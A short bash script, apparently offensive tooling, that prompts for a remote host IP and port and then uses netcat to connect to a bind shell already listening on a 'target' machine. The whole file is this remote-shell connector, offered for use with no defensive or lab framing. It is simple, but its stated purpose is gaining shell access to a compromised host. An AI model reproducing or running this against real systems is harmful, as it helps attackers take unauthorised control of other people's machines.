#!/bin/bash
#a script to connect to your bind shell using NetCat

#enter remote host data
echo "Enter remote host IP"
read RHOST
echo "Enter remote host listening port"
read RPORT
echo "press [Enter] to connect to target"
read enter

nc $RHOST $RPORT
